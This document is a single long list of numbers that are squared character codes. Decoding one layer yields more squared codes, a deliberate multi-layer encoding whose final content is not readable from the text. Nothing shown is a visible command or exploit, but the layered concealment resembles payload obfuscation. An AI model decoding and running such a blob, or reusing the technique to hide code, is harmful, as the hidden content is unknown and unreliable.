3249,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,2500,3136,2304,3249,1936,2401,2601,2704,2809,2916,1936,2500,3025,2304,2704,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,3025,3249,2500,2401,1936,2916,2704,2304,2304,1936,2704,3025,2916,2401,1936,2401,2601,2704,2809,2916,1936,3025,3249,2500,2401,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2401,2304,2916,2304,3249,1936,2601,2401,2601,2916,1936,2916,2704,2304,2304,1936,2500,2809,2304,2304,1936,2401,2401,3136,3136,2401,1936,3025,2601,3249,2916,1936,2401,2500,2601,2500,2401,1936,2916,2304,3136,2704,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2500,2601,2500,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,2401,2601,2704,2809,2916,1936,3025,3249,2500,2401,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,2401,2601,2500,2500,2809,1936,2401,2500,2601,2500,2401,1936,2500,3025,2304,2704,1936,3025,2500,2500,2809,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,2401,2601,2704,2809,2916,1936,2500,3249,2401,2916,1936,3025,2601,3249,2916,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2401,2809,2916,1936,2401,2401,3136,3136,2401,1936,2916,3136,3136,3249,1936,3249,3136,2304,2401,1936,2401,2704,2401,2916,2401,1936,3025,2809,2916,3249,1936,2401,2401,2304,2500,2809,1936,2401,2500,2601,2500,2401,1936,2401,2401,2500,2601,2916,1936,3025,3249,2500,2401,1936,2809,2601,2500,3249,1936,2500,3025,2304,2704,1936,2401,2704,2704,2304,2304,1936,3249,2304,2500,2809,1936,2401,2304,2500,2304,2401,1936,2601,2304,2500,2809,1936,2601,2304,2500,2809,1936,2401,2304,2500,2304,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2809,2401,2500,3249,1936,2401,2809,2916,2500,2809,1936,2401,2401,2809,2916,1936,3136,2916,2704,3249,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,2500,2809,2304,2304,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,3249,2304,2500,2809,1936,3025,3249,2500,2401,1936,2916,2704,2304,2304,1936,2704,3025,2916,2401,1936,2401,2601,2704,2809,2916,1936,3025,3249,2500,2401,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2809,2401,2500,3249,1936,2401,2809,2916,2500,2809,1936,2401,2401,2809,2916,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,2401,2500,2601,2500,2401,1936,2401,2500,3249,3249,2916,1936,2401,2401,3136,3136,2401,1936,2500,3025,2304,2704,1936,2809,3025,3025,2916,1936,2401,2401,3136,3136,2401,1936,2500,3025,2304,2704,1936,2401,2304,3136,2401,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,2500,2809,2304,2304,1936,2401,2916,2304,2304,1936,2704,2601,2809,2916,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2704,2916,2704,2401,1936,2401,2401,3136,3136,2401,1936,2916,2704,2304,2304,1936,3249,3136,2304,2401,1936,2916,2304,3136,2704,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2500,2601,2500,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,2401,2601,2704,2809,2916,1936,3025,3249,2500,2401,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,2401,2601,2500,2500,2809,1936,2401,2500,2601,2500,2401,1936,2500,3025,2304,2704,1936,3025,2500,2500,2809,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,2401,2601,2704,2809,2916,1936,2500,3249,2401,2916,1936,3025,2601,3249,2916,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2401,2809,2916,1936,2601,2401,2601,2916,1936,2401,2304,2704,2304,2704,1936,3249,3136,2304,2401,1936,2500,2809,2304,2304,1936,3249,3136,2304,2401,1936,3025,3249,2500,2401,1936,2401,2401,3136,3136,2401,1936,3249,3136,2304,2401,1936,3025,2809,2916,3249,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2500,2809,2304,2304,1936,2401,2601,2704,2809,2916,1936,3025,2601,3249,2916,1936,2401,2704,2916,2704,2401,1936,2401,2500,2601,2500,2401,1936,3136,2916,2704,3249,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,2401,2500,2601,2500,2401,1936,2401,2500,3249,3249,2916,1936,2401,2401,3136,3136,2401,1936,2500,3025,2304,2704,1936,2809,3025,3025,2916,1936,2401,2401,3136,3136,2401,1936,2500,3025,2304,2704,1936,2401,2304,3136,2401,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,3136,2916,2704,3249,1936,2401,2304,2500,2704,1936,3025,3249,2500,2401,1936,2401,2601,2704,2809,2916,1936,3025,2601,3249,2916,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,3025,3249,2500,2401,1936,2916,2704,2304,2304,1936,2704,2601,2809,2916,1936,2401,2304,2916,2304,3249,1936,2401,2401,3136,3136,2401,1936,3025,2601,3249,2916,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,2401,2401,2809,2916,1936,3136,2500,3136,2401,1936,3136,2916,2704,3249,1936,2401,2304,2500,2704,1936,3025,3249,2500,2401,1936,2401,2601,2704,2809,2916,1936,3025,2601,3249,2916,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2304,2500,2704,1936,2401,3136,2704,3249,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,3025,3249,2500,2401,1936,2916,2704,2304,2304,1936,2704,3025,2916,2401,1936,2401,2601,2704,2809,2916,1936,3025,3249,2500,2401,1936,2401,2916,3136,2401,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2916,2304,3249,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,2500,3136,2304,3249,1936,2401,2601,2704,2809,2916,1936,2500,3025,2304,2704,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2500,3136,2304,3249,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2916,2304,3136,2704,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2401,2809,2916,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2500,2809,2304,2304,1936,2916,2704,2304,2304,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,3249,2304,2500,2809,1936,2401,2401,3136,3136,2401,1936,2401,2401,2809,2916,1936,2401,2304,2500,2704,1936,2500,2809,2304,2304,1936,2601,2401,2601,2916,1936,2916,2704,2304,2304,1936,2704,2601,2809,2916,1936,2401,2304,2500,2704,1936,2601,2304,2500,2809,1936,2401,2304,2500,2704,1936,2500,3025,2304,2704,1936,2916,2704,2304,2304,1936,2401,2304,2500,2704,1936,2916,2809,2916,2401,1936,2401,2401,2500,2601,2916,1936,2401,2304,2500,2704,1936,2704,3025,2916,2401,1936,2916,2704,2304,2304,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2500,3136,2304,3249,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2916,2304,3136,2704,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2500,3136,2304,3249,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2916,2304,3136,2704,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,2401,3136,2704,3249,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,2401,2704,2916,2704,2401,1936,2401,2500,2601,2500,2401,1936,3025,2601,3249,2916,1936,2401,2500,2601,2500,2401,1936,3025,3249,2500,2401,1936,2500,3025,2304,2704,1936,3136,2401,2304,2304,1936,2401,2601,2704,2809,2916,1936,3249,3136,2304,2401,1936,2704,3025,2916,2401,1936,2916,2704,2304,2304,1936,2704,2601,2809,2916,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2401,2809,2916,1936,2401,2601,2704,2809,2916,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2500,3249,2401,2916,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,3025,3249,2500,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2704,3025,2916,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2401,2500,2601,2500,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2500,2809,2304,2304,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2401,2601,2500,2500,2809,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2401,2304,3136,2401,2916,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2401,2401,3136,3136,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,3025,2809,2916,3249,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,3249,2704,2304,3249,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,3025,2601,3249,2916,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2704,2601,2809,2916,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,3249,3136,2304,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2916,2704,2304,2304,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2401,2304,2916,2304,3249,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2401,2304,2304,2304,2304,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2601,2401,2601,2916,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2401,2704,2916,2704,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2500,3025,2304,2704,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2401,2304,2704,2304,2704,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2500,3136,2304,3249,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2916,3025,2500,2704,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2401,2500,3249,3249,2916,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2809,2401,3136,2704,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2809,2304,2704,2401,1936,2401,2401,2809,2916,1936,3136,2916,2704,3249,1936,2401,2916,3136,2401,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2704,2601,2809,2916,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2704,2916,2704,2401,1936,2401,2401,3136,3136,2401,1936,2916,2704,2304,2304,1936,3249,3136,2304,2401,1936,2916,2304,3136,2704,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2500,2601,2500,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,2401,2601,2704,2809,2916,1936,3025,3249,2500,2401,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,2401,2704,2916,2704,2401,1936,2401,2500,2601,2500,2401,1936,2500,3025,2304,2704,1936,3025,2500,2500,2809,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,2401,2601,2704,2809,2916,1936,2500,3249,2401,2916,1936,3025,2601,3249,2916,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,3249,2304,2500,2809,1936,2500,3136,2304,3249,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2916,2304,3136,2704,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2500,2601,2500,2401,1936,2401,3249,2601,2916,1936,3136,2500,3136,2401,1936,2401,2809,2500,2401,1936,2401,3136,2704,3249,1936,2401,2401,2809,2916,1936,2401,2809,2500,2401,1936,2401,2401,2809,2916,1936,2401,3136,2704,3249,1936,2401,2809,2500,2401,1936,2401,2809,2500,2401,1936,2401,3136,2704,3249,1936,2401,2401,2809,2916,1936,2401,2809,2500,2401,1936,2401,2401,2809,2916,1936,2401,3136,2704,3249,1936,2401,2809,2500,2401,1936,2401,3249,2601,2916,1936,3249,2304,2500,2809,1936,2500,2809,2304,2304,1936,3249,3136,2304,2401,1936,3025,3249,2500,2401,1936,3136,2916,2704,3249,1936,2401,3249,2601,2916,1936,2500,3025,2304,2704,1936,2601,2401,2601,2916,1936,2401,2304,2704,2304,2704,1936,2401,2500,2601,2500,2401,1936,3136,2916,2704,3249,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,3136,2500,3136,2401,1936,3249,2304,2500,2809,1936,2500,3136,2304,3249,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2916,2304,3136,2704,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2500,2601,2500,2401,1936,3136,2916,2704,3249,1936,2401,3249,2601,2916,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2916,2304,3249,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2704,2916,2704,2401,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2401,2809,2916,1936,3249,2304,2500,2809,1936,2500,3136,2304,3249,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2916,2304,3136,2704,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2500,2601,2500,2401,1936,2401,2401,2809,2916,1936,3136,2916,2704,3249,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2916,2304,3249,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,2500,3136,2304,3249,1936,2401,2601,2704,2809,2916,1936,2500,3025,2304,2704,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2500,3136,2304,3249,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2704,2601,2809,2916,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2704,2916,2704,2401,1936,2401,2401,3136,3136,2401,1936,2916,2704,2304,2304,1936,3249,3136,2304,2401,1936,2916,2304,3136,2704,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2500,2601,2500,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,2401,2601,2704,2809,2916,1936,3025,3249,2500,2401,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,2401,2601,2500,2500,2809,1936,2401,2500,2601,2500,2401,1936,2500,3025,2304,2704,1936,3025,2500,2500,2809,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,2401,2601,2704,2809,2916,1936,2500,3249,2401,2916,1936,3025,2601,3249,2916,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2500,3136,2304,3249,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2916,2304,3136,2704,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2500,2601,2500,2401,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,3249,2304,2500,2809,1936,2500,3136,2304,3249,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2916,2304,3136,2704,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2500,2601,2500,2401,1936,3136,2916,2704,3249,1936,2401,2304,2500,2704,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,2401,2601,2704,2809,2916,1936,2916,3025,2500,2704,1936,3249,3136,2304,2401,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,3249,2304,2500,2809,1936,2500,3136,2304,3249,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2401,2500,2500,2809,1936,2401,2304,2500,2704,1936,2916,2809,2916,2401,1936,2401,2916,3136,2401,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,3136,2916,2704,3249,1936,2401,2304,2500,2704,1936,2601,2401,2601,2916,1936,2401,2500,2601,2500,2401,1936,2704,2601,2809,2916,1936,2916,2704,2304,2304,1936,2500,3025,2304,2704,1936,2401,2500,2601,2500,2401,1936,2704,3249,2304,2304,1936,2401,2500,3249,3249,2916,1936,2401,2500,2601,2500,2401,1936,3025,3249,2500,2401,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2809,2500,2401,1936,2401,3136,2704,3249,1936,2401,2401,2809,2916,1936,2401,2809,2500,2401,1936,2401,2401,2809,2916,1936,2401,3136,2704,3249,1936,2401,2809,2500,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,2401,2601,2704,2809,2916,1936,2916,3025,2500,2704,1936,3249,3136,2304,2401,1936,2401,2809,2500,2401,1936,2401,3136,2704,3249,1936,2401,2401,2809,2916,1936,2401,2809,2500,2401,1936,2401,2401,2809,2916,1936,2401,3136,2704,3249,1936,2401,2809,2500,2401,1936,2401,3249,2601,2916,1936,2401,2304,2500,2704,1936,2601,2304,2500,2809,1936,2401,3249,2601,2916,1936,2401,2304,2500,2704,1936,2500,3025,2304,2704,1936,2601,2401,2601,2916,1936,2401,2304,2704,2304,2704,1936,2401,2500,2601,2500,2401,1936,3136,2916,2704,3249,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2809,2916,2500,2809,1936,2401,2809,2500,2401,1936,2401,2916,3136,2401,1936,3136,2916,2704,3249,1936,3249,3136,2304,2401,1936,3249,2704,2304,3249,1936,2401,2401,2916,2916,2704,1936,2401,2401,2916,2916,2704,1936,2401,2809,2401,2500,3249,1936,2401,2500,2809,2704,2704,1936,2401,2500,3249,3249,2916,1936,2401,2401,2304,2500,2809,1936,2401,2601,3249,2500,2704,1936,3249,2704,2304,3249,1936,2401,2601,2704,2809,2916,1936,2401,2304,2500,2304,2401,1936,3136,2500,3136,2401,1936,2401,2809,2500,2401,1936,3249,2304,2500,2809,1936,2500,2601,2304,2704,1936,2401,2809,2500,2401,1936,2401,3249,2601,2916,1936,2401,2809,2500,2401,1936,3249,2304,2500,2809,1936,2500,2704,2304,2401,1936,2401,2809,2500,2401,1936,2401,3249,2601,2916,1936,2401,2809,2500,2401,1936,3249,2304,2500,2809,1936,2500,2809,2304,2304,1936,2401,2809,2500,2401,1936,2401,3249,2601,2916,1936,2401,2809,2500,2401,1936,3249,2304,2500,2809,1936,2500,2916,2304,2401,1936,2401,2809,2500,2401,1936,3136,2916,2704,3249,1936,2601,2704,3136,2401,1936,3249,2304,2500,2809,1936,2500,2601,2304,2704,1936,2601,3025,2500,2401,1936,3249,2304,2500,2809,1936,2401,2601,2704,2809,2916,1936,2401,2304,3136,2401,2916,1936,2401,2401,2304,2500,2809,1936,2401,2601,2500,2500,2809,1936,2401,2304,2500,2704,1936,2401,2601,2500,2500,2809,1936,2401,2304,2500,2304,2401,1936,2401,2401,2916,2916,2704,1936,2401,2304,2500,2304,2401,1936,3249,3136,2304,2401,1936,2401,2601,2704,2809,2916,1936,2401,2304,2500,2704,1936,2500,2601,2304,2704,1936,2601,2704,3136,2401,1936,3249,2304,2500,2809,1936,2500,2704,2304,2401,1936,2601,3025,2500,2401,1936,3136,2500,3136,2401,1936,3136,2916,2704,3249,1936,2601,2704,3136,2401,1936,3249,2304,2500,2809,1936,2500,2809,2304,2304,1936,2601,3025,2500,2401,1936,2401,2601,2704,2809,2916,1936,2401,2500,2601,2500,2401,1936,2704,2500,2500,2809,1936,2401,2500,3249,3249,2916,1936,2401,2500,3249,3249,2916,1936,3249,2704,2304,3249,1936,2401,2704,2916,2704,2401,1936,2401,2304,2500,2704,1936,2401,2809,2500,2401,1936,3249,2916,2304,2704,1936,2401,2601,3249,2500,2704,1936,2401,2500,2401,2304,2304,1936,2500,2601,2304,2704,1936,2704,3249,2304,2304,1936,2500,2916,2304,2401,1936,2401,2704,3136,3136,2704,1936,2916,2500,2704,2401,1936,2809,3249,2500,3249,1936,2704,2500,2500,2809,1936,2401,2601,2916,3136,3249,1936,2401,2401,2704,2704,3249,1936,2401,2500,2809,2704,2704,1936,2916,2304,3136,2704,1936,2601,2500,2704,3249,1936,2704,2704,3136,3249,1936,2500,2704,2304,2401,1936,3136,2401,2304,2304,1936,3025,3025,2704,2704,1936,2704,2916,2500,2704,1936,2809,2916,2500,2809,1936,3025,2500,2500,2809,1936,2809,3025,3025,2916,1936,2401,2500,3025,2916,3249,1936,2401,2401,2916,2916,2704,1936,2809,2704,3025,2916,1936,2401,2601,2704,2809,2916,1936,2500,3249,2401,2916,1936,3025,3249,2500,2401,1936,2704,3025,2916,2401,1936,2401,2500,2601,2500,2401,1936,2500,2809,2304,2304,1936,2401,2601,2500,2500,2809,1936,2401,2304,3136,2401,2916,1936,2401,2401,3136,3136,2401,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,3025,2601,3249,2916,1936,2704,2601,2809,2916,1936,3249,3136,2304,2401,1936,2916,2704,2304,2304,1936,2401,2304,2916,2304,3249,1936,2401,2304,2304,2304,2304,1936,2601,2401,2601,2916,1936,2401,2704,2916,2704,2401,1936,2500,3025,2304,2704,1936,2401,2304,2704,2304,2704,1936,2500,3136,2304,3249,1936,2916,3025,2500,2704,1936,2401,2500,3249,3249,2916,1936,2809,2401,3136,2704,1936,2809,2304,2704,2401,1936,2601,2304,2500,2809,1936,2916,2809,2916,2401,1936,2916,3136,3136,3249,1936,2401,2704,2401,2916,2401,1936,2401,2401,2304,2500,2809,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2401,2704,2704,2304,2304,1936,2401,2304,2500,2304,2401,1936,3025,2304,2809,2916,1936,2401,2809,2500,2401,1936,2601,2704,3136,2401,1936,3249,2304,2500,2809,1936,2500,2916,2304,2401,1936,2601,3025,2500,2401,1936,2401,2601,2704,2809,2916,1936,2401,2500,2601,2500,2401,1936,2704,2500,2500,2809,1936,2401,2500,3249,3249,2916,1936,2401,2500,3249,3249,2916,1936,3249,2704,2304,3249,1936,2401,2704,2916,2704,2401,1936,2401,2304,2500,2704,1936,2401,2809,2500,2401,1936,2704,2500,2500,2809,1936,2704,2601,2809,2916,1936,2704,2704,3136,3249,1936,2704,2916,2500,2704,1936,2704,3025,2916,2401,1936,2704,3249,2304,2304,1936,2809,2304,2704,2401,1936,2809,2401,3136,2704,1936,2809,2601,2500,3249,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,2809,3025,3025,2916,1936,2809,3249,2500,3249,1936,2916,2304,3136,2704,1936,2916,2500,2704,2401,1936,2916,2704,2304,2304,1936,2916,2809,2916,2401,1936,2916,3025,2500,2704,1936,2916,3136,3136,3249,1936,3025,2304,2809,2916,1936,3025,2500,2500,2809,1936,3025,2601,3249,2916,1936,3025,2809,2916,3249,1936,3025,3025,2704,2704,1936,3025,3249,2500,2401,1936,3136,2401,2304,2304,1936,3249,2704,2304,3249,1936,3249,2916,2304,2704,1936,3249,3136,2304,2401,1936,2401,2304,2304,2304,2304,1936,2401,2304,2500,2304,2401,1936,2401,2304,2704,2304,2704,1936,2401,2304,2916,2304,3249,1936,2401,2304,3136,2401,2916,1936,2401,2401,2304,2500,2809,1936,2401,2401,2500,2601,2916,1936,2401,2401,2704,2704,3249,1936,2401,2401,2916,2916,2704,1936,2401,2401,3136,3136,2401,1936,2401,2500,2401,2304,2304,1936,2401,2500,2601,2500,2401,1936,2401,2500,2809,2704,2704,1936,2401,2500,3025,2916,3249,1936,2401,2500,3249,3249,2916,1936,2401,2601,2500,2500,2809,1936,2401,2601,2704,2809,2916,1936,2401,2601,2916,3136,3249,1936,2401,2601,3249,2500,2704,1936,2401,2704,2401,2916,2401,1936,2401,2704,2704,2304,2304,1936,2401,2704,2916,2704,2401,1936,2401,2704,3136,3136,2704,1936,2500,2601,2304,2704,1936,2500,2704,2304,2401,1936,